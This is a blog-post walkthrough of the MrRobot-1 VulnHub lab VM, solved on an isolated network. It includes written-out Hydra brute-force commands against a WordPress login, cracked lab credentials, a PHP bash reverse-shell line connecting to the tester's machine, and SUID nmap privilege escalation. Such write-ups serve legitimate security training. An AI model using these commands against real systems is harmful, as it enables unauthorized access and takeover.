<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <script type="application/javascript" src='http://localhost:1313/js/theme-mode.js'></script>
    <link rel="stylesheet" href='http://localhost:1313/css/frameworks.min.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/github.min.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/github-style.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/light.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/dark.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/syntax.css' />
    <title>MrRobot-1 VulnHub Challenge – Full Walkthrough - Kjersheim - Projects &amp; Docs</title>
    
    <link rel="icon" type="image/x-icon" href='http://localhost:1313/images/favicon.ico'>
    
    <meta name="theme-color" content="#1e2327">

    
    

    
    <meta name="description"
  content="A full penetration test walkthrough of the MrRobot-1 VM from VulnHub, including network setup, enumeration, brute force login with Hydra, exploitation via reverse shell, privilege escalation, and root flag discovery." />
<meta name="keywords"
  content='' />
<meta name="robots" content="noodp" />
<link rel="canonical" href="http://localhost:1313/post/mrrobot/" />


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="MrRobot-1 VulnHub Challenge – Full Walkthrough - Kjersheim - Projects &amp; Docs" />
<meta name="twitter:description"
  content="A full penetration test walkthrough of the MrRobot-1 VM from VulnHub, including network setup, enumeration, brute force login with Hydra, exploitation via reverse shell, privilege escalation, and root flag discovery." />
<meta name="twitter:site" content="http://localhost:1313/" />
<meta name="twitter:creator" content="" />
<meta name="twitter:image"
  content="http://localhost:1313/">


<meta property="og:type" content="article" />
<meta property="og:title" content="MrRobot-1 VulnHub Challenge – Full Walkthrough - Kjersheim - Projects &amp; Docs">
<meta property="og:description"
  content="A full penetration test walkthrough of the MrRobot-1 VM from VulnHub, including network setup, enumeration, brute force login with Hydra, exploitation via reverse shell, privilege escalation, and root flag discovery." />
<meta property="og:url" content="http://localhost:1313/post/mrrobot/" />
<meta property="og:site_name" content="MrRobot-1 VulnHub Challenge – Full Walkthrough" />
<meta property="og:image"
  content="http://localhost:1313/">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta property="article:published_time" content="2024-01-11 00:00:00 &#43;0000 UTC" />











</head>


<body>
  <div style="position: relative">
  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
      <a class="Header-link" href="http://localhost:1313/">
        <img class="octicon" height="32" width="32" src="/images/avatar.svg">
      </a>
    </div>
    <div class="Header-item d-md-none">
      <button class="Header-link btn-link js-details-target" type="button"
        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
          </path>
        </svg>
      </button>
    </div>
    <div style="display: none;" id="header-search"
      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
      <div
        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
        <div class="position-relative">
          
          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
            autocomplete="off">
            <label
              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
              <input type="text"
                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
                name="q" value="" placeholder="Search" autocomplete="off">
              <input type="hidden" name="q" value="site:http://localhost:1313/">
            </label>
          </form>
          
        </div>
      </div>
    </div>

    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
      <a class="Header-link " href="http://localhost:1313/">
        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="/images/avatar.svg">
      </a>
    </div>
    <div class="Header-item" style="margin-right: 0;">
      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
          version="1.1" width="16" height="16">
          <path fill-rule="evenodd" clip-rule="evenodd"
            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
          </path>
        </svg>
      </a>
    </div>
  </header>
</div>

  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
</div>

  
<div class="application-main">
  <div>
  <main>
    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
      <div class="px-0">
        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
          <div class="flex-auto min-width-0 width-fit mr-3">
            <div class="d-flex">
              <div class="d-none d-md-block">
                <a class="avatar mr-2 flex-shrink-0" href="http://localhost:1313/">
                  <img class=" avatar-user"
                    src="/images/avatar.png"
                    width="32" height="32"></a>
              </div>
              <div class="d-flex flex-column">
                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
                  <span class="author">
                    <a href="http://localhost:1313/">Andreas</a>
                  </span>
                  <span class="path-divider">/</span>
                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
                    <a href="http://localhost:1313/post/mrrobot/">MrRobot-1 VulnHub Challenge – Full Walkthrough</a>
                  </strong>
                </h1>
                <div class="note m-0">
                  Created <relative-time datetime="Thu, 11 Jan 2024 00:00:00 &#43;0000"
                    class="no-wrap">
                    Thu, 11 Jan 2024 00:00:00 &#43;0000</relative-time>

                  
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="container-lg px-3 new-discussion-timeline">
      <div class="repository-content gist-content">
        <div>
          <div class="js-gist-file-update-container js-task-list-container file-box">
            <div id="file-pytest" class="file my-2">
              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
                    
                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
                      </svg>
                    </summary>
                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
                        </div>
                      </div>
                    </details-menu>
                      4138 Words
                    

                  </div>
                  <div class="file-actions flex-order-2 pt-0">
                    
                  </div>
                </div>
              </div>


              <div class="Box-body px-5 pb-5" style="z-index: 1">
                <article class="markdown-body entry-content container-lg"><h1 id="contents">Contents</h1>
<p><a href="#_Toc155948911">1 Introduction 3</a></p>
<p><a href="#_Toc155948912">1.1 File integrity 3</a></p>
<p><a href="#_Toc155948913">1.2 Network 4</a></p>
<p><a href="#_Toc155948914">1.3 Setting up a DHCP server 5</a></p>
<p><a href="#_Toc155948915">2 Identifying the MrRobot VM 6</a></p>
<p><a href="#_Toc155948916">2.1 Source Code 8</a></p>
<p><a href="#_Toc155948917">2.2 First Key Found 8</a></p>
<p><a href="#_Toc155948918">2.3 Files from the webserver 9</a></p>
<p><a href="#_Toc155948919">2.4 Web Directory Enumeration 12</a></p>
<p><a href="#_Toc155948920">2.5 BruteForce with Hydra 15</a></p>
<p><a href="#_Toc155948921">2.5.1 Using Hydra to BruteForce the Username 16</a></p>
<p><a href="#_Toc155948922">2.5.2 Using Hydra to BruteForce the Password 18</a></p>
<p><a href="#_Toc155948923">2.6 Exploitation 20</a></p>
<p><a href="#_Toc155948924">2.6.1 WordPress Plugin: Reverse Shell 21</a></p>
<p><a href="#_Toc155948925">2.7 Second Key Found 23</a></p>
<p><a href="#_Toc155948926">2.8 Gaining Root Access and Finding the Third Key 23</a></p>
<p><a href="#_Toc155948927">3 Summary and Discussion 25</a></p>
<p><a href="#_Toc155948928">References 27</a></p>
<h1 id="introduction">Introduction</h1>
<p>After browsing through the Vulnhub challenges, I decided to go with a listed one from the exercise materials as there were a plethora of new challenges but not too many walkthroughs. Having spent 5 hours documenting the <a href="http://www.badstore.net">www.badstore.net</a> challenge, I decided to swiftly find one to start, hence choosing the MrRobot-1 challenge:</p>
<p><a href="https://www.vulnhub.com/entry/mr-robot-1%2C151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a></p>
<p>The challenge description states as follows:</p>
<p><em>Based on the show, Mr. Robot.</em></p>
<p><em>This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.</em></p>
<p><em>The VM isn&rsquo;t too difficult. There isn&rsquo;t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.</em></p>
<p>The exercise was started 10am, Thursday 11.01.2024, and concluded Friday 11.am. Between these I spent 9 hours working on the challenges, although a fair bit of time to research the challenge and to set up the machines in a safe enviroment.</p>
<h2 id="file-integrity">File integrity</h2>
<p><img src="/images/mrrobot1/1.jpg" alt=""></p>
<p>Downloading the VM-image, which is always a risk considering private people are making these challenges and may cause harm. However as it is a known challenge, I download the image. The verification for the image file is added as md5 and sha1 values, so atleast I can doublecheck the file integrity.</p>
<p>![A black background with white text</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>Windows Defended most certainly did not like this file and removed it immediately, but upon restoring I checked the md5 hash-value of the file to verify it with the Vulnhub value.</p>
<p>![A computer screen shot of a program</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>They do match, so I continue the exercise by importing the ova-image to my VirtualBox. Ideally for the future I would like to create a dedicated VM used for the training exercises, as despite the Vulnhub page is a respected and much used resource for ethical hacking, exploration and penetration testing, it is also community run and I am not sure how trustworthy every single file downloaded from their pages are.</p>
<h2 id="network">Network</h2>
<p>As a bare minimum I start by installing the MrRobot ova-file as a VM in my VirtualBox, and setting the network adapter to an internal network with my Kali VM. I do not know if this is needed for the challenge, but at least I then will have a Kali VM connected to the MrRobot VM if needed for later, and it would be isolated in its own network.</p>
<p><img src="data:image/png;base64..." alt=""><img src="data:image/png;base64..." alt=""></p>
<p><img src="data:image/png;base64..." alt="">As we have not set up a DHCP server yet, the Kali machine does not have an IP address.</p>
<p>The IPv6 address is a link-local address, which means it&rsquo;s used for communication within the local network segment, typically not routable beyond that segment. It&rsquo;s a self-assigned address for the interface on the internal network.</p>
<h2 id="setting-up-a-dhcp-server">Setting up a DHCP server</h2>
<p>![A black screen with white text</p>
<p>Description automatically generated](data:image/png;base64&hellip;)VirtualBox installation path:</p>
<p><img src="data:image/png;base64..." alt="">Finding the VboxManage.exe file and running it to see the contents, although too large to add in this report.</p>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Within it we find a section about DHCP Management. To have some clarity of what we already have, we list the current information before starting to add a new server.</p>
<p>From this we see the only information avaliable is the Host-Only Ethernet Adapter.</p>
<p>![A black background with white text</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Chosing a range for the Ips, and enabling a new server</p>
<p>![A screen shot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Listing the DHCP servers again, we now have the new server for our internal VM network</p>
<p>![A computer screen shot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Starting the Kali VM box to see if it has been able to receive an IP</p>
<p>So the DHCP server is working. Initially upon investigating some parts of the challenge, some walkthroughs discussed the idea behind the MrRobot-challenge as a webserver, and that the IP is not know nor can we do much without accessing the webserver. So first step is to have some sort of connectivity to it, and I realized the Kali VM in connection with the internal network was a good idea.</p>
<h1 id="identifying-the-mrrobot-vm">Identifying the MrRobot VM</h1>
<p>When going through the resources, I did not see any login or password for the MrRobot Vm, nor any other information as such. Starting with a scan of the local subnet that my Kali VM is connected to – and which the MrRobot VM also atleast by its settings is connected to.</p>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>The scan shows 2 devices, of which one is the Kali VM. The other should then be the MrRobot VM as there are no other devices connected. Marked in green shows the Ipv4 address <em>192.168.3.3</em>. In addition, NMAP shows that two ports are open, 80 and 443, commonly used for http and https. A 3rd port, 22 for ssh is shown closed. That eliminates any easy way into ssh-ing into the target. I try to open the address in a browser to see if there is any information there.</p>
<p>![A computer keyboard with a black keypad and a blue x</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Trying the url with https:// also give the same result.</p>
<p>Going through the commands show videos which describes the MrRobot and fsociety’s ambitions and targets, as well as entertaining info in a rather visually pleasing and entertaining design. However, from the information there nothing seem obvious. I note that the last command, <em>join</em>, asks for the users email address as a promt. This could be investigated later, but for now I will focus on the source code and files more easily accessible.</p>
<h2 id="source-code">Source Code</h2>
<p>From the sourcecode, several javascript files are avaliable, some with more data than others. Due to other information state there is not much to fetch from these, I note that they are there and move on.</p>
<p>![A screen shot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<h2 id="first-key-found">First Key Found</h2>
<p><img src="data:image/png;base64..." alt=""></p>
<p>A robots.txt file is a standard used by websites to communicate with web crawlers and search engine bots. It serves as a set of instructions for these bots, telling them which parts of the website are off-limits for indexing or crawling. The robots.txt file helps website owners control how search engines access their content and prevents sensitive or private information from being indexed and displayed in search results.</p>
<p>In the context of the MrRobot-1 VM challenge, the first key was discovered in the robots.txt file. This file is often the first place security researchers and hackers look for hidden or restricted content on a website. By finding the key in this file, it suggests that the challenge designers intended to provide a clue or challenge related to website enumeration and understanding how web crawlers interact with websites.</p>
<p>The contents of key-1-of-3.txt file</p>
<p><img src="data:image/png;base64..." alt=""></p>
<h2 id="files-from-the-webserver">Files from the webserver</h2>
<p><img src="data:image/png;base64..." alt=""></p>
<p>In the context of this exercise, the &ldquo;wget -mpEk&rdquo; command was used to download the entire MrRobot webpage and its associated content efficiently. This command had several options working together to ensure a comprehensive download. It mirrored the webpage by recursively retrieving linked pages and their content, such as images and CSS files (with the &ldquo;m&rdquo; and &ldquo;p&rdquo; options). The &ldquo;E&rdquo; option handled file extensions, while the &ldquo;k&rdquo; option converted links within HTML files for local use. This approach provided a complete snapshot of the webpage, enabling a thorough examination that led to the discovery of the hidden fsocity.dic file in the robots.txt file.</p>
<p>Although wget is a powerful command-line tool for such tasks, alternative methods exist. Browser extensions like &ldquo;Save Page WE&rdquo; (for Firefox) or &ldquo;Download All Images&rdquo; (for Chrome) offer a more user-friendly approach with one-click downloads. Graphical download managers such as &ldquo;Internet Download Manager&rdquo; and &ldquo;Free Download Manager&rdquo; provide intuitive interfaces. However, wget remains favored for automation and complex mirroring tasks due to its command-line efficiency and flexibility, making it essential for tasks like web scraping.</p>
<p>![A screenshot of a computer program</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>The <em>grep -Rnwo . -e &lsquo;key&rsquo;</em> command is used to search for the whole word &lsquo;key&rsquo; within files in the current directory and its subdirectories. It recursively scans files, displays line numbers for matches, and only shows the matched &lsquo;key&rsquo; values. This command is valuable for locating specific content in a batch of files.</p>
<p>![A screenshot of a computer program</p>
<p>Description automatically generated](data:image/png;base64&hellip;)As such I also find the first key file by using grep on the downloaded files.</p>
<p>![A computer screen shot of text</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>It is clear to me that not all files are being downloaded with the above wget commands, as we don’t have access to the key-1-of-3.txt nor fsocity.dic files. Opening these directly in the browser, as done previously with the key, reveals the .dic file as a list of words. Attempts using cURL also failed to retrieve the two mentioned files, so for now use the path directly and download them manually.</p>
<p>![A screenshot of a computer program</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>Looking at the fsocity.dic file, we find a rather large file with words. Using sort and counting the lines, without duplicates shows over 11000 unique words.</p>
<p>![A screen shot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p><img src="data:image/png;base64..." alt="">Saving the unique results in its own file.</p>
<h2 id="web-directory-enumeration">Web Directory Enumeration</h2>
<p>Web directory enumeration is a critical process in web security assessments, and it serves to identify hidden sub-directories associated with a target website. When I perform web directory enumeration, my primary objective is to uncover sub-directories that might not be directly linked from the website&rsquo;s main page. These hidden directories often contain sensitive information, configuration files, or potential vulnerabilities that could be exploited. By systematically listing these sub-directories, I gain insight into the website&rsquo;s structure, making it easier to assess its security posture and detect any misconfigurations or weaknesses that require attention. This process is a fundamental step in both security assessments and website administration tasks.</p>
<p>To conduct web directory enumeration, I employ the Nmap tool with the -script switch and specifically choose the http-enum script. Nmap, a versatile network scanning tool, allows me to discover open ports, services, and other crucial details about the target host. The http-enum script interacts with the web server by sending requests and analyzing responses to identify existing directories and resources. After completing the Nmap scan, I obtain a list of operational sub-directories associated with the target website. These directories are either displayed in the scan output or saved for further examination. This systematic approach not only helps in mapping the website&rsquo;s structure but also aids in uncovering potential vulnerabilities or hidden content that might be overlooked during a cursory assessment.</p>
<p>![A screenshot of a computer screen</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>In terms of HTTP enumeration, the scan identified several potentially interesting paths and files. It found paths like &ldquo;/admin/&rdquo; and &ldquo;/wp-login.php,&rdquo; indicating the possibility of an admin section and login page. The presence of &ldquo;/robots.txt&rdquo; indicated that there might be directives for web crawlers. Furthermore, the scan detected various paths related to WordPress, including versions 2.2, 2.5, 2.6, and 2.7, along with paths to the WordPress login page and upgrade page. The &ldquo;/readme.html&rdquo; file was marked as interesting, potentially containing relevant information.</p>
<p>![A screenshot of a computer program</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Using the Nikto command also gave similar results</p>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Testing the different listed items as extensions to the original URL, I come across a WordPress login page.</p>
<p>We have a possible wordlist, and a login page. Although we dont know if the username or the password is within the list, and so far neither have been found elsewhere on the webserver.</p>
<h2 id="bruteforce-with-hydra">BruteForce with Hydra</h2>
<p>Hydra is a powerful and versatile password-cracking tool used for brute force attacks. It is designed to automate the process of trying multiple usernames and passwords to gain unauthorized access to various login systems, such as web applications, SSH, FTP, email, and more. Hydra essentially automates the repetitive task of attempting different username and password combinations until a valid one is found or until all possibilities have been exhausted.</p>
<p>Hydra is being used to perform a brute force attack on the WordPress login page located at &ldquo;/wp-login.php.&rdquo; It attempts to find valid login credentials for the WordPress admin panel by systematically trying different username and password combinations. Hydra works by sending POST requests to the login page with various username and password pairs, as specified by the user.</p>
<p>By analyzing the POST request made when attempting to log in, Hydra can craft and send similar requests with different credentials to check for successful login attempts. This process continues until it either successfully logs in or exhausts all possible combinations. Hydra is a valuable tool for security professionals and penetration testers to assess the strength of login credentials and identify vulnerabilities in web applications and other systems.</p>
<p><img src="data:image/png;base64..." alt="">I start with using BurpSuite to intercept what happends when I click the login button on the WordPress login page. The process for this was initially to open BurpSuite, chose the <em>Proxy</em> tab and launche the browser. In the browser I entered the address <em>http://192.168.3.3/wp-login.php</em>. Once I had filled in test credentials <em>user</em> and <em>password</em>, I turned <em>intercept</em> on.</p>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)The result after clicking the <em>Log In</em> button was as follows.</p>
<h3 id="using-hydra-to-bruteforce-the-username">Using Hydra to BruteForce the Username</h3>
<p>In order to guess usernames and passwords to access a WordPress site, we need to send a special request to the website&rsquo;s login page. If the website tells us that a username is invalid, we can keep trying different usernames. To do this, we have a list of possible words of interests in a file called <em>fsocity.dic.uniq</em>. We don&rsquo;t care about the passwords for now; we&rsquo;ll use the same password for all the attempts. Now a point to know about Wordpress is that if we enter a valid username in wordpress, it actually tells us in the <em>error</em> message if we have that username or not.</p>
<p>$ hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.3.3 http-post-form &lsquo;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username&rsquo;</p>
<p>(Tafani-Dereeper, 2017)</p>
<p>The hydra command with the given options is used for brute forcing usernames in an HTTP form. Here&rsquo;s a breakdown of the options:</p>
<p>-vV: These options make the command run in verbose mode, providing detailed output, and display version information about Hydra.</p>
<p>-L fsocity.dic.uniq: This option specifies the username list to be used for the brute force attack. It reads usernames from the &ldquo;fsocity.dic.uniq&rdquo; file.</p>
<p>-p wedontcare: Here, it sets a static password &ldquo;wedontcare&rdquo; for all the login attempts since the focus is on enumerating usernames and not passwords.</p>
<p>192.168.3.3: This is the IP address of the target machine that we&rsquo;re attempting to attack.</p>
<p>http-post-form: It indicates that Hydra should perform a brute force attack on an HTTP POST form.</p>
<p>&lsquo;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username&rsquo;: This part specifies the target URL and form parameters. &ldquo;/wp-login.php&rdquo; is the path to the login page. &ldquo;^USER^</p>
<p>Initially I ran the command as is, but to try to keep more control over the terminal, I added the option -q quiet and saved the results to a textfile <em>results.txt</em></p>
<p>![A screenshot of a computer screen</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>In the Hydra brute-force attack, I successfully discovered three valid words for the potential username &ldquo;elliot.&rdquo; These words were &ldquo;elliot,&rdquo; &ldquo;ELLIOT,&rdquo; and &ldquo;Elliot.&rdquo; This finding indicates the existence of the username &ldquo;elliot&rdquo; and provides multiple options for accessing the WordPress administration interface.</p>
<p>To progress with the password, I could attempt each of the discovered words in combination with the username &ldquo;elliot&rdquo; to log in to the WordPress admin interface (http://192.168.3.3/wp-admin/). Once logged in, I could further explore the website&rsquo;s content and potentially find clues or keys hidden within it. This successful password discovery is a crucial step in advancing through the challenge, as it grants me access to the WordPress environment and potentially uncovers additional vulnerabilities or hidden information.</p>
<h3 id="using-hydra-to-bruteforce-the-password">Using Hydra to BruteForce the Password</h3>
<p>$ hydra -vV -l elliot -P fsocity.dic.uniq vm http-post-form &lsquo;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect&rsquo;</p>
<p>(Tafani-Dereeper, 2017)</p>
<p>![A computer screen with white text</p>
<p>Description automatically generated](data:image/png;base64&hellip;)The modified command I used is as follows</p>
<p>The -l elliot flag specifies the username <em>elliot</em>, which is the target of the attack. The -P fsocity.dic.uniq flag indicates the password list to be used, which is the <em>fsocity.dic.uniq</em> file. The command uses the http-post-form module to define the login form parameters. It includes the login page path, login and password placeholders (^USER^ and ^PASS^), and a failure condition that checks for the presence of the text &ldquo;is incorrect&rdquo; in the response. This setup allows Hydra to systematically test passwords from the provided list against the username &ldquo;elliot&rdquo; and monitor the responses to determine if a valid password is found.</p>
<p>The results of the Hydra attack indicate that it successfully discovered the password for the &ldquo;elliot&rdquo; account, which is <em>ER28-0652</em>. This password can be used to log in to the WordPress administration interface. The attack ran at an average rate of 2257 tries per minute and took approximately three minutes to complete. The successful password discovery demonstrates the effectiveness of Hydra in finding weak credentials through brute force attacks, highlighting the importance of strong and unique passwords to protect online accounts and systems.</p>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)And with those credentials, I successfully logged into the WordPress portal.</p>
<p>![A screen shot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Looking through the different pages on the Administration Panels does not immidiately bring forth information in regard to the wanted 2nd and 3rd flag. It does however confirm the user elliot as an administrator and also a subscriber with the username <em>mich05654</em> and Name <em>krista Gordon</em>.</p>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Going through the pages there are limited information and mostly default themes and WordPress information. In the <em>Media</em> section I found links to several pictures used on in the layout of the webpage that I saw initially. I did not further explore the contents of the images with steganography tools, but it was a point saved for later.</p>
<h2 id="exploitation">Exploitation</h2>
<p>From several sources I noted that authors had gotten access to an admin bash shell to the WordPress Page in this challenge. Initially I researched wether or not to use WPScan to search for vulnerabilities, although that would require me at this point to connect my Kali VM to the internet and do some updates of the WPScan database. Wanting to refrain from breaking the connection and keeping the system isolated, I held off on this thought. Another exploit I found with getting access to a shell as a main goal, was a WordPress Plugin called Reverse Shell, and another WordPress Admin Shell Upload.</p>
<h3 id="wordpress-plugin-reverse-shell">WordPress Plugin: Reverse Shell</h3>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)This plugin allows the user to upload a file that contains a reverse shell payload. The reverse shell payload typically includes code that connects back to the attacker’s machine, establishing a remote shell session. To exploit this vulnerability, we need to find a vulnerable WordPress installation, often one with outdated plugins or themes. When browsing through the Administration Menu on the page, I did notice a page within the themes section that had a 404.php page.</p>
<p>Using this php page and editing the code could be a solution, and running the code by visiting the page. I code used in a plugin as this were as follows, modified with my Mr Robot VMs IP.</p>
<?php

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.3.2/443 0>&1'");
?>
<p>Seven Layers(2024)</p>
<p>![A screenshot of a cell phone</p>
<p>Description automatically generated](data:image/png;base64&hellip;)I attempted to make use of this, navigating to the 404 page of the template and inserting the code above the pre-existing code. This should initiate a bash shell back to my Kali VM with the ip 192.168.3.2 on the port 443.</p>
<p>![A screenshot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)I opened up a terminal window, and initiated a netcat listener (-l) on port 443 with verbose (-v) output, allowing for incoming connections, typically used for setting up a listener on a specific port for various networking tasks.</p>
<p>To initiate the code, I opened a non existing page, and by doing so I had access to a shell</p>
<p><img src="data:image/png;base64..." alt=""><img src="data:image/png;base64..." alt=""></p>
<h2 id="second-key-found">Second Key Found</h2>
<p>![A screenshot of a computer program</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Navigating in the shell brings me to the home folder where I find the following two files, <em>key-2-of-3.txt</em> and <em>password.raw-md5</em>. To open the key file we need to gain access to the user robot. Trying to see if the password file has a known hash-value by searching existing databases on a separate box connected to the internet. By a quick search, it suggested the MD5 Hash-value could be the list of letters in the english alphabet <em>abcdefghijklmnopqrstuvwxyz</em></p>
<p>![A screen shot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)Attempting to log into robot with this password revealed the limitations of the initial shell, and I found a method from a user nwrzd (2019), to start a tty shell. From there we managed to open the second key text-file.</p>
<h2 id="gaining-root-access-and-finding-the-third-key">Gaining Root Access and Finding the Third Key</h2>
<p>The strategy employed for privilege escalation was to identify an executable file with the SUID (Set User ID) bit set, which can allow running commands with elevated privileges. The &lsquo;find&rsquo; command was used to search for files with the SUID bit enabled, specified by the query parameter for file permissions (4000). This search generated a list of potential files, and among them, the executable &rsquo;nmap&rsquo; was found.</p>
<p>![A screenshot of a computer program</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>Previously, older versions of &rsquo;nmap&rsquo; had an interactive mode that permitted executing shell commands within it. Luckily, the version on this system supported this feature. By entering the interactive mode and opening a new shell, I gained access with root privileges.</p>
<p>![A screen shot of a computer</p>
<p>Description automatically generated](data:image/png;base64&hellip;)</p>
<p>![A screenshot of a computer program</p>
<p>Description automatically generated](data:image/png;base64&hellip;)With root access, I performed a search for the third key using the phrase <em>key-3</em>, seeing how the previous two keys were named. Doing so I found the third key.</p>
<h1 id="summary-and-discussion">Summary and Discussion</h1>
<p>In this cyber security exercise, I tested the MrRobot-1 challenge, which was designed to test and enhance my penetration testing skills. The challenge consisted of finding three progressively difficult keys hidden in different locations within a virtual machine. This exercise aimed to simulate real-world scenarios, allowing me to practice various techniques and tools commonly used by ethical hackers and security professionals.</p>
<p>I began by ensuring the file integrity of the VM image and setting up a network connection with my Kali VM. Setting up a DHCP server allowed me to obtain an IP address for the MrRobot VM. After conducting a network scan, I discovered the target VM&rsquo;s IP address and open ports, including HTTP and HTTPS.</p>
<p>The first key was found in the robots.txt file, emphasizing the importance of web enumeration techniques. Web directory enumeration helped identify potential areas of interest, such as the WordPress login page. Using the powerful tool Hydra, I successfully conducted a brute-force attack on the WordPress login page, revealing valid usernames and passwords.</p>
<p>Exploitation became the focus, with an exploration of WordPress plugins like the Reverse Shell plugin. I managed to gain access to the MrRobot VM through a reverse shell payload, ultimately leading to the discovery of the second key.</p>
<p>Privilege escalation was achieved by identifying an executable file with the SUID bit set, granting root-level access. This allowed me to locate the third and final key, completing the challenge.</p>
